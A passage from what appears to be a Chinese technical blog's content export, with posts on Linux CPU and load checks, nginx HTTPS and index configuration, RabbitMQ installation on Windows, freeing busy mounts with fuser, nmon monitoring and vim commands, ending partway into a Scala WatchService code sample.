<h1 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h1><p>CPU优化之前来几个获取CPU核数的命令.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># CPU总核数 = 物理CPU个数 * 每颗物理CPU的核数 </span></span><br><span class="line"><span class="comment"># 总逻辑CPU数 = 物理CPU个数 * 每颗物理CPU的核数 * 超线程数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看CPU信息（型号） </span></span><br><span class="line">[root@localhost ~]<span class="comment"># cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c</span></span><br><span class="line">      4  Intel(R) Core(TM) i5-6200U CPU @ 2.30GHz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看物理CPU个数</span></span><br><span class="line">[root@localhost ~]<span class="comment"># cat /proc/cpuinfo| grep "physical id"| sort| uniq| wc -l</span></span><br><span class="line">2</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看每个物理CPU中core的个数(即核数)</span></span><br><span class="line">[root@localhost ~]<span class="comment"># cat /proc/cpuinfo| grep "cpu cores"| uniq</span></span><br><span class="line">cpu cores	: 2</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看逻辑CPU的个数</span></span><br><span class="line">[root@localhost ~]<span class="comment"># cat /proc/cpuinfo| grep "processor"| wc -l</span></span><br><span class="line">4</span><br></pre></td></tr></table></figure></p>
<h2 id="uptime"><a href="#uptime" class="headerlink" title="uptime"></a>uptime</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># uptime</span></span><br><span class="line"> 00:16:20 up  2:18,  1 user,  load average: 0.00, 0.01, 0.03</span><br></pre></td></tr></table></figure>
<p>对应字段的意思:<br>当前时间 开机时间  在线用户数  平均负载<br>其中平均负载有三个值,分别代表 1分钟、5分钟、15分钟的平均负载。这三个值越来越大代表负载一直在减小,反之就是负载在增加。<br>load average数据是每隔5秒钟检查一次活跃的进程数，然后按特定算法计算出的数值。如果这个数除以逻辑CPU的数量，结果高于5的时候就表明系统在超负荷运转了。</p>
<h2 id="top"><a href="#top" class="headerlink" title="top"></a>top</h2><p><img src="/2019/02/20/linux/Linux性能调优/top_20190220161153.png" alt></p>
<h1 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h1><h1 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h1><h1 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h1>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx配置https</title>
    <url>/2019/08/02/linux/nginx%E9%85%8D%E7%BD%AEhttps/</url>
    <content><![CDATA[<p>https 配置首先需要去购买 ssl 证书.<br>我是从西部数据购买的证书。当然阿里云、腾讯、百度、华为都有免费的 SSL 证书。</p>
<a id="more"></a>
<h1 id="购买证书"><a href="#购买证书" class="headerlink" title="购买证书"></a>购买证书</h1><p>购买后下载 SSL 证书即可<br><img src="/2019/08/02/linux/nginx配置https/20190802201927.png" alt></p>
<p>将证书上传至服务器.</p>
<h1 id="配置-nginx"><a href="#配置-nginx" class="headerlink" title="配置 nginx"></a>配置 nginx</h1><p>直接配置 nginx 的 ssl 证书路径即可.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># HTTPS server</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       443 ssl;</span><br><span class="line">        server_name  www.example.com;</span><br><span class="line"></span><br><span class="line">        ssl_certificate      /var/ssl/example.com.crt;</span><br><span class="line">        ssl_certificate_key  /var/ssl/example.com.key;</span><br><span class="line"></span><br><span class="line">        ssl_session_cache    shared:SSL:1m;</span><br><span class="line">        ssl_session_timeout  5m;</span><br><span class="line"></span><br><span class="line">        ssl_ciphers  HIGH:!aNULL:!MD5;</span><br><span class="line">        ssl_prefer_server_ciphers  on;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            root   html;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location /life/api/v1/ &#123;</span><br><span class="line">            proxy_pass http://127.0.0.1:9090/api/v1/;</span><br><span class="line">            proxy_redirect  off;</span><br><span class="line">            proxy_set_header        Host    $http_host;</span><br><span class="line">            proxy_set_header        X-Real-IP       $remote_addr;</span><br><span class="line">            proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">            proxy_set_header   Cookie $http_cookie;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>nginx 配置的话也比较简单。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx默认首页配置</title>
    <url>/2019/07/27/linux/nginx%E9%BB%98%E8%AE%A4%E9%A6%96%E9%A1%B5%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>http节点下配置index,指定具体的路径即可.<br><a id="more"></a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">error_log   /logs/openresty/error.log;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">                      &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                     &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line"></span><br><span class="line">    access_log  /logs/openresty/access.log;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    #keepalive_timeout  0;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line">    </span><br><span class="line">    # 指定默认配置首页路径</span><br><span class="line">    index index.html;</span><br><span class="line">    #gzip  on;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  localhost 39.104.70.154;</span><br><span class="line"></span><br><span class="line">        charset utf8;</span><br><span class="line"></span><br><span class="line">        #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">        location /api/&#123;</span><br><span class="line">           proxy_pass  http://127.0.0.1:8080;</span><br><span class="line">           index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">           root html;</span><br><span class="line">           index index.html;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       location /hello &#123;</span><br><span class="line">           default_type text/html;</span><br><span class="line">           content_by_lua &apos;ngx.say(&quot;Hello Nginx&quot;)&apos;;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">        error_page  404              /404.html;</span><br><span class="line"></span><br><span class="line">        # redirect server error pages to the static page /50x.html</span><br><span class="line">        #</span><br><span class="line">        error_page   500 502 503 504  /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">            root   html;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>rabbitmq安装(windows)</title>
    <url>/2018/03/30/mq/rabbitmq%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<p>RabbitMQ is the most widely deployed open source message broker.<br>With more than 35,000 production deployments of RabbitMQ world-wide at small startups and large enterprises, RabbitMQ is the most popular open source message broker.<br>RabbitMQ is lightweight and easy to deploy on premises and in the cloud. It supports multiple messaging protocols. RabbitMQ can be deployed in distributed and federated configurations to meet high-scale, high-availability requirements.</p>
<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>本文以rabbitmq3.7.4版本为例,来做简单的安装(windows).<br>rabbimq是Erlang语言开发,安装rabbitmq之前先安装配置<a href="http://www.erlang.org/downloads" target="_blank" rel="noopener">Erlang</a>语言开发环境,<br>然后下载<a href="http://www.rabbitmq.com/download.html" target="_blank" rel="noopener">rabbitmq安装包</a>.</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>点击exe一直下一步即可,进入sbin目录,执行rabbitmq-server.bat start 启动server 。默认没有图形界面,<br>执行<br><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">rabbitmq_server</span>-3.7.4\<span class="title">sbin</span>&gt;<span class="title">rabbitmq</span>-<span class="title">plugins.bat</span> <span class="title">enable</span> <span class="title">rabbitmq_management</span></span></span><br><span class="line"><span class="function"><span class="title">Enabling</span> <span class="title">plugins</span> <span class="title">on</span> <span class="title">node</span> <span class="title">rabbit</span>@<span class="title">PC</span>-2018:</span></span><br><span class="line"><span class="function"><span class="title">rabbitmq_management</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">following</span> <span class="title">plugins</span> <span class="title">have</span> <span class="title">been</span> <span class="title">configured</span>:</span></span><br><span class="line"><span class="function">  <span class="title">rabbitmq_management</span></span></span><br><span class="line"><span class="function">  <span class="title">rabbitmq_management_agent</span></span></span><br><span class="line"><span class="function">  <span class="title">rabbitmq_web_dispatch</span></span></span><br><span class="line"><span class="function"><span class="title">Applying</span> <span class="title">plugin</span> <span class="title">configuration</span> <span class="title">to</span> <span class="title">rabbit</span>@<span class="title">PC</span>-2018...</span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">following</span> <span class="title">plugins</span> <span class="title">have</span> <span class="title">been</span> <span class="title">enabled</span>:</span></span><br><span class="line"><span class="function">  <span class="title">rabbitmq_management</span></span></span><br><span class="line"><span class="function">  <span class="title">rabbitmq_management_agent</span></span></span><br><span class="line"><span class="function">  <span class="title">rabbitmq_web_dispatch</span></span></span><br><span class="line"><span class="function"><span class="title">set</span> 3 <span class="title">plugins</span>.</span></span><br></pre></td></tr></table></figure></p>
<p>安装web插件.重新启动rabbitmq,<br><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">rabbitmq_server</span>-3.7.4\<span class="title">sbin</span>&gt;<span class="title">rabbitmq</span>-<span class="title">server.bat</span> <span class="title">start</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  ##  ##</span></span><br><span class="line"><span class="function">  ##  ##      <span class="title">RabbitMQ</span> 3.7.4. <span class="title">Copyright</span> (<span class="title">C</span>) 2007-2018 <span class="title">Pivotal</span> <span class="title">Software</span>, <span class="title">Inc</span>.</span></span><br><span class="line"><span class="function">  ##########  <span class="title">Licensed</span> <span class="title">under</span> <span class="title">the</span> <span class="title">MPL</span>.  <span class="title">See</span> <span class="title">http</span>://<span class="title">www.rabbitmq.com</span>/</span></span><br><span class="line"><span class="function">  ######  ##</span></span><br><span class="line"><span class="function">  ##########  <span class="title">Logs</span>: <span class="title">C</span>:/<span class="title">Users</span>/<span class="title">xwolf</span>/<span class="title">AppData</span>/<span class="title">Roaming</span>/<span class="title">RabbitMQ</span>/<span class="title">log</span>/<span class="title">RABBIT</span>~1.<span class="title">LOG</span></span></span><br><span class="line"><span class="function">                    <span class="title">C</span>:/<span class="title">Users</span>/<span class="title">xwolf</span>/<span class="title">AppData</span>/<span class="title">Roaming</span>/<span class="title">RabbitMQ</span>/<span class="title">log</span>/<span class="title">rabbit</span>@<span class="title">PC</span>-2018<span class="title">_upgrade.log</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">              <span class="title">Starting</span> <span class="title">broker</span>...</span></span><br><span class="line"><span class="function"> <span class="title">completed</span> <span class="title">with</span> 3 <span class="title">plugins</span>.</span></span><br></pre></td></tr></table></figure></p>
<p>上述信息,表示rabbitmq正常启动.</p>
<p>rabbitmq 默认图形界面地址<a href="http://localhost:15672" target="_blank" rel="noopener">http://localhost:15672</a>,默认用户名、密码为guest/guest.</p>
]]></content>
      <categories>
        <category>mq</category>
      </categories>
      <tags>
        <tag>rabbitmq</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux unmount device is busy(转)</title>
    <url>/2017/10/25/linux/linux%20unmount%20%20device%20is%20busy/</url>
    <content><![CDATA[<p>当任何目录有 mount, 然后有程序使用/挂在那个目录上的话, 就没有办法 umount 掉, 於 umount 时会出现 Device is busy 的讯息.<br>要怎麼找出是哪个程序挂在那个目录上? 然后去把那个程式砍掉呢?使用 fuser 的指令<br>那要怎麼找出是哪个程式挂在那个目录上？可以使用 fuser - identify processes using files or sockets<br>假设现在 mount 起来的目录是 /media/share</p>
<ul>
<li><p>查询: </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fuser -m /media/share</span><br></pre></td></tr></table></figure>
</li>
<li><p>显示: /media/share: 25023c<br>就代表是 process 25023(pid) 有使用到此目录, 后面 c 代表的意思可参考下述:</p>
</li>
<li>c: current directory.</li>
<li>e: executable being run.</li>
<li>f: open file. f is omitted in default display mode.</li>
<li>F: open file for writing. F is omitted in default display mode.</li>
<li>r: root directory.</li>
<li>m: mmap’ed file or shared library.<br>要把这个资源释放的话, 可以有下述做法:<pre><code class="lang-bash">kill -9 25023  # ps aux | grep 25023  #应该就会看到它
fuser -m -v -i -k /media/share # 会问你是不是要把 25023 这个 kill 掉, 选 y 就会 kill 掉
</code></pre>
提示信息如下:<pre><code> USER      PID   ACCESS COMMAND
 /meida/share: root      25023 ..c..  bash
 Kill process 25023 ? (y/N) y
</code></pre></li>
</ul>
<h6 id="转自"><a href="#转自" class="headerlink" title="转自:"></a>转自:</h6><p><a href="http://blog.csdn.net/radkitty/article/details/5337304" target="_blank" rel="noopener">linux umount 时出现device is busy 的处理方法</a>         </p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>nmon监控</title>
    <url>/2019/03/29/linux/nmon%E7%9B%91%E6%8E%A7/</url>
    <content><![CDATA[<p>nmon 是一种在 AIX 与各种 Linux 操作系统上广泛使用的监控与分析工具，相对于其它一些系统资源监控工具来说，nmon 所记录的信息是比较全面的，它能在系统运行过程中实时地捕捉系统资源的使用情况，并且能输出结果到文件中，然后通过 nmon_analyzer 工具产生数据文件与图形化结果。</p>
<a id="more"></a>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>安装比较简单,直接 yum 安装即可.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install nmon</span><br></pre></td></tr></table></figure>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="监控"><a href="#监控" class="headerlink" title="监控"></a>监控</h2><p>输入 nmon 进入监控界面<br><img src="/2019/03/29/linux/nmon监控/nmon_20190329094009.png" alt></p>
<p>通过键入提示的命令来查看不同的信息.</p>
<ol>
<li>CPU</li>
</ol>
<p>键入 C 查看 cpu 信息<br><img src="/2019/03/29/linux/nmon监控/nmon_cpu_20190329095019.png" alt></p>
<ol>
<li>内存</li>
</ol>
<p><img src="/2019/03/29/linux/nmon监控/memoery_20190329095210.png" alt></p>
<ol>
<li>disk IO</li>
</ol>
<p><img src="/2019/03/29/linux/nmon监控/disk_io_20190329095338.png" alt></p>
<p>这里只列出上面的几个监控信息。</p>
<h2 id="收集数据"><a href="#收集数据" class="headerlink" title="收集数据"></a>收集数据</h2><p>nmon 的命令信息:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">For Data-Collect-Mode Options</span><br><span class="line">        -f            spreadsheet output format [note: default -s300 -c288]</span><br><span class="line">                         output file is &lt;hostname&gt;_YYYYMMDD_HHMM.nmon</span><br><span class="line">        -F &lt;filename&gt; same as -f but user supplied filename</span><br><span class="line">                         Not recommended as the default file name is perfect</span><br><span class="line">        The other options <span class="keyword">in</span> alphabetical order:</span><br><span class="line">        -a            Include Accelerator GPU stats</span><br><span class="line">        -b            Online only: <span class="keyword">for</span> black and white mode (switch off colour)</span><br><span class="line">        -c &lt;number&gt;   The number of snapshots before nmon stops</span><br><span class="line">        -d &lt;disks&gt;    To <span class="built_in">set</span> the maximum number of disks [default 256]</span><br><span class="line">                      Ignores disks <span class="keyword">if</span> the systems has 100<span class="string">'s of disk or the config is odd!</span></span><br><span class="line"><span class="string">        -D            Use with -g to add the Disk Wait/Service Time &amp; in-flight stats</span></span><br><span class="line"><span class="string">        -f and -F     See above</span></span><br><span class="line"><span class="string">        -g &lt;filename&gt; User Defined Disk Groups (see above) - Data Capture: Generates  BBBG &amp; DG                               lines</span></span><br><span class="line"><span class="string">        -g auto       See above but makes the file "auto" for you of just the disks like sda etc                              .</span></span><br><span class="line"><span class="string">        -h            This help output</span></span><br><span class="line"><span class="string">        -I &lt;percent&gt;  Set the ignore process &amp; disks busy threshold (default 0.1%)</span></span><br><span class="line"><span class="string">                      Don'</span>t save or show proc/disk using less than this percent</span><br><span class="line">        -J            Switch-off Journel Filesystem stats collection (can causes issues with aut                              omound NFS)</span><br><span class="line">        -l &lt;dpl&gt;      Disks per line <span class="keyword">in</span> data capture to avoid spreadsheet width issues. Default                               150. EMC=64.</span><br><span class="line">        -m &lt;directory&gt; nmon changes to this directory before saving to file</span><br><span class="line">                      Useful when starting nmon via cron</span><br><span class="line">        -M              Adds MHz stats <span class="keyword">for</span> each CPU thread. Some POWER8 model CPU cores can be d                              ifferent frequencies</span><br><span class="line">        -N            Include NFS Network File System <span class="keyword">for</span> V2, V3 and V4</span><br><span class="line">        -p            nmon outputs the PID when it starts. Useful <span class="keyword">in</span> scripts to capture the PID                               <span class="keyword">for</span> a later safe stop.</span><br><span class="line">        -r &lt;runname&gt;  Use <span class="keyword">in</span> a benchmark to record the run details <span class="keyword">for</span> later analysis [default h                              ostname]</span><br><span class="line">        -R              Old rrdtool format used by some - may be removed <span class="keyword">in</span> the future. If you u                              se this email Nigel</span><br><span class="line">        -s &lt;seconds&gt;  Time between snap shots - with <span class="string">"-c count"</span> decides duration of the data <span class="built_in">cap</span>                              ture</span><br><span class="line">        -t            Include Top Processes <span class="keyword">in</span> the output</span><br><span class="line">        -T            As -t plus it saves <span class="built_in">command</span> line arguments <span class="keyword">in</span> UARG section</span><br><span class="line">        -U            Include the Linux 10 CPU utilisation stats (CPUUTIL lines <span class="keyword">in</span> the file)</span><br><span class="line">        -V            Print nmon version &amp; <span class="built_in">exit</span> immediately</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>-f 指定文件的格式</li>
<li>-s 采样的时间间隔</li>
<li>-c 总共采样时间</li>
<li>-m 指定文件存放的目录</li>
</ul>
</blockquote>
<p>用下面的命令才保存采样信息:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@hadoop01 ~]<span class="comment"># nmon -s 1 -c 360 -f -m  /opt/nmon</span></span><br><span class="line">[root@hadoop01 ~]<span class="comment"># ll -h /opt/nmon/</span></span><br><span class="line">total 184K</span><br><span class="line">-rw-r--r-- 1 root root 134K Mar 29 10:16 hadoop01_190329_1014.nmon</span><br><span class="line">-rw-r--r-- 1 root root  46K Mar 29 10:21 hadoop01_190329_1021.nmon</span><br></pre></td></tr></table></figure>
<h2 id="nmon-analyser"><a href="#nmon-analyser" class="headerlink" title="nmon analyser"></a>nmon analyser</h2><p>将 nmon 文件转化为 csv 文件,</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@hadoop01 nmon]<span class="comment"># sort hadoop01_190329_1021.nmon &gt; hadoop01_190329_1021.csv</span></span><br><span class="line">[root@hadoop01 nmon]<span class="comment"># ll -ah</span></span><br><span class="line">total 776K</span><br><span class="line">drwxr-xr-x  2 root root  104 Mar 29 10:39 .</span><br><span class="line">drwxr-xr-x. 7 root root   73 Mar 29 10:14 ..</span><br><span class="line">-rw-r--r--  1 root root 134K Mar 29 10:16 hadoop01_190329_1014.nmon</span><br><span class="line">-rw-r--r--  1 root root 319K Mar 29 10:39 hadoop01_190329_1021.csv</span><br><span class="line">-rw-r--r--  1 root root 319K Mar 29 10:27 hadoop01_190329_1021.nmon</span><br></pre></td></tr></table></figure>
<p>下载<a href="https://www.ibm.com/developerworks/community/wikis/home?lang=en#!/wiki/Power+Systems/page/nmon_analyser" target="_blank" rel="noopener">分析工具</a>,</p>
<p>解压 nmon analyser v60.xlsm 这个文件就是分析工具,以为是个 exe 呢…</p>
<p>主界面就是这样,点击 Analyze nmon data 载入文件即可看到下面的统计信息:</p>
<p><img src="/2019/03/29/linux/nmon监控/nmon_tools_20190329104834.png" alt></p>
<p><img src="/2019/03/29/linux/nmon监控/nmon_analyser_20190329104529.png" alt></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Nmon" target="_blank" rel="noopener">Nmon wiki</a></li>
<li><a href="http://nmon.sourceforge.net/pmwiki.php" target="_blank" rel="noopener">nmon for Linux</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>sed使用案例</title>
    <url>/2021/08/08/linux/sed/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>vim命令</title>
    <url>/2018/01/22/linux/vim%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="Vi和Vim的使用"><a href="#Vi和Vim的使用" class="headerlink" title="Vi和Vim的使用"></a>Vi和Vim的使用</h1><p>基本上 vi/vim 共分为三种模式，分别是命令模式（Command mode），输入模式（Insert mode）和底线命令模式（Last line mode）。 这三种模式的作用分别是：<br>命令模式：</p>
<p>用户刚刚启动 vi/vim，便进入了命令模式。</p>
<p>此状态下敲击键盘动作会被Vim识别为命令，而非输入字符。比如我们此时按下i，并不会输入一个字符，i被当作了一个命令。</p>
<p>以下是常用的几个命令：</p>
<blockquote>
<ul>
<li>i 切换到输入模式，以输入字符。</li>
<li>x 删除当前光标所在处的字符。</li>
<li>: 切换到底线命令模式，以在最底一行输入命令。</li>
</ul>
</blockquote>
<p>若想要编辑文本：启动Vim，进入了命令模式，按下i，切换到输入模式。</p>
<p>命令模式只有一些最基本的命令，因此仍要依靠底线命令模式输入更多命令。</p>
<h1 id="Vim-基本命令"><a href="#Vim-基本命令" class="headerlink" title="Vim 基本命令"></a>Vim 基本命令</h1><table>

<tr>
    <td>分类 </td> 
    <td> 命令 </td> 
</tr>
<!--一、文件操作相关-->
<tr>
    <td rowspan="8">一、文件打开、保存、另存为、新建关闭
    </td> 

</tr>

<tr>
<td> vim filepath //编辑filepath文件,不存在也可以</td> 
</tr>

<tr>
<td> :e filepath //打开filepath文件</td> 
</tr>

<tr>
<td> :w //保存文件</td> 
</tr>

<tr>
<td> :sav filepath //另存为指定文件</td> 
</tr>

<tr>
<td> :wq //保存并退出</td> 
</tr>

<tr>
<td> :q //退出编辑器</td> 
</tr>

<tr>
<td> :q! //强制退出编辑器</td> 
</tr>

<!--二、插入-->
<tr>
    <td rowspan="10">二、插入
    </td> 

</tr>

<tr>
<td>i //在光标之前插入</td> 
</tr>

<tr>
<td> a //在光标之后插入</td> 
</tr>

<tr>
<td> A  //在一行的结尾处追加</td> 
</tr>

<tr>
<td>I //在一行的开头处插入</td> 
</tr>

<tr>
<td>o // 在光标所在位置的下一行打开新行插入</td> 
</tr>

<tr>
<td>O  // 在光标所在位置的上一行打开新行插入</td> 
</tr>

<tr>
<td> J //合并光标所在行及下一行为一行</td> 
</tr>

<tr>
<td>R //替换(覆盖)当前光标位置及后面的内容</td> 
</tr>

<tr>
<td>cw // 替换从光标所在位置后到一个单词结尾的字符</td> 
</tr>


<!--三、光标移动-->
<tr>
    <td rowspan="6">三、光标移动
    </td> 

</tr>

<tr>
<td>上下左右方向键</td> 
</tr>

<tr>
<td> 空格键 向右、Backspace 向左、Enter 移动到下一行首、- 移动到上一行首。</td> 
</tr>

<tr>
<td> 命令模式下：h 向左、j 向下 、k 向上、l 向右。
</td> 
</tr>

<tr>
<td>:$ //到末尾</td> 
</tr>

<tr>
<td>:n // n为数字,跳转到指定行的行首,:0跳转到第一行的行首</td> 
</tr>

<!--四、删除、恢复字符或行-->
<tr>
    <td rowspan="10">四、删除、恢复字符或行
    </td> 
</tr>

<tr>
<td>x  //删除当前光标下的字符</td> 
</tr>

<tr>
<td>nx //删除从光标开始的n个字符</td> 
</tr>

<tr>
<td>dw //删除光标之后的单词剩余部分</td> 
</tr>

<tr>
<td> d$ //删除光标之后的该行剩余部分
</td> 
</tr>

<tr>
<td>dd //删除当前行</td> 
</tr>

<tr>
<td>ndd //向下删除当前行在内的n行</td> 
</tr>

<tr>
<td>:m,nd //删除m到n行的内容</td> 
</tr>

<tr>
<td>u //撤销上一步操作</td> 
</tr>

<tr>
<td>U //撤销对当前行的所有操作</td> 
</tr>

<!--五、搜索和替换-->
<tr>
    <td rowspan="10">五、搜索和替换
    </td> 
</tr>

<tr>
<td>/word //向光标下搜索word字符串</td> 
</tr>

<tr>
<td>?word //向光标上搜索word字符串</td> 
</tr>

<tr>
<td>n //向下搜索前一个搜素动作</td> 
</tr>

<tr>
<td>N //向上搜索前一个搜索动作
</td> 
</tr>

<tr>
<td>:s/old/new //用new替换行中首次出现的old</td> 
</tr>

<tr>
<td>:s/old/new/g //用new替换行中所有的old</td> 
</tr>

<tr>
<td>:n1,n2s/word1/word2/g  //n1 与 n2 为数字。在第 n1 与 n2 行之间寻找 word1 这个字符串，并将该字符串取代为 word2</td> 
</tr>

<tr>
<td>:1,$s/word1/word2/g   //从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 </td> 
</tr>

<tr>
<td>:1,$s/word1/word2/gc   //从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 ！且在取代前显示提示字符给用户确认 (confirm) 是否需要取代！ </td> 
</tr>

<!--六、复制、粘贴-->
<tr>
    <td rowspan="11">六、复制、粘贴
    </td> 
</tr>

<tr>
<td>yy //复制游标所在的那一行</td> 
</tr>

<tr>
<td>nyy //n 为数字。复制光标所在的向下 n 行，例如 20yy 则是复制 20 行</td> 
</tr>

<tr>
<td>y1G //复制游标所在行到第一行的所有数据</td> 
</tr>

<tr>
<td>yG //复制游标所在行到最后一行的所有数据
</td> 
</tr>

<tr>
<td>y0 //复制光标所在的那个字符到该行行首的所有数据</td> 
</tr>

<tr>
<td>y^ //复制从光标到行首的内容。</td> 
</tr>


<tr>
<td>y$ //复制光标所在的那个字符到该行行尾的所有数据</td> 
</tr>

<tr>
<td>yw //复制从光标开始到词尾的字符。</td> 
</tr>

<tr>
<td>nyw //复制从光标开始的n个单词。</td> 
</tr>

<tr>
<td>p,P //p 为将已复制的数据在光标下一行贴上，P 则为贴在游标上一行！ 举例来说，我目前光标在第 20 行，且已经复制了 10 行数据。则按下 p 后， 那 10 行数据会贴在原本的 20 行之后，亦即由 21 行开始贴。但如果是按下 P 呢？ 那么原本的第 20 行会被推到变成 30 行。 </td> 
</tr>

<!--七、环境设置-->
<tr>
    <td rowspan="11">七、环境设置
    </td> 
</tr>

<tr>
<td>:set nu   //设置行号</td> 
</tr>

<tr>
<td>:set nonu //取消行号</td> 
</tr>


</table>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
<ul>
<li><a href="http://www.runoob.com/linux/linux-vim.html" target="_blank" rel="noopener">Linux vi/vim </a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>WatchService监听文件变化</title>
    <url>/2019/03/23/scala/WatchService%E7%9B%91%E5%90%AC%E6%96%87%E4%BB%B6%E5%8F%98%E5%8C%96/</url>
    <content><![CDATA[<p>在一些系统中需要一些开关变量来控制一下功能的使用。通常可以配置DB,文件,配置中心等。本文以文件来说明,通过来监听文件的变化来实现配置变量的动态感知。<br><a id="more"></a><br>用JDK7提供的WatchService来实现文件的监听,废话不多说直接上代码。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xwolf.scala.bigdata.jdk.core</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.&#123;<span class="type">FileSystems</span>, <span class="type">Paths</span>, <span class="type">StandardWatchEventKinds</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @author xwolf</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileWatchUtil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 为文件注册监听事件</span></span><br><span class="line"><span class="comment">    * @param filePath 监听的文件目录</span></span><br><span class="line"><span class="comment">    * @param fileName 监听的文件名称</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">register</span></span>(filePath:<span class="type">String</span>,fileName:<span class="type">String</span>):<span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> path = <span class="type">Paths</span>.get(filePath)</span><br><span class="line">    <span class="keyword">val</span> watchService = <span class="type">FileSystems</span>.getDefault.newWatchService()</span><br><span class="line">    <span class="comment">// 注册监听事件</span></span><br><span class="line">    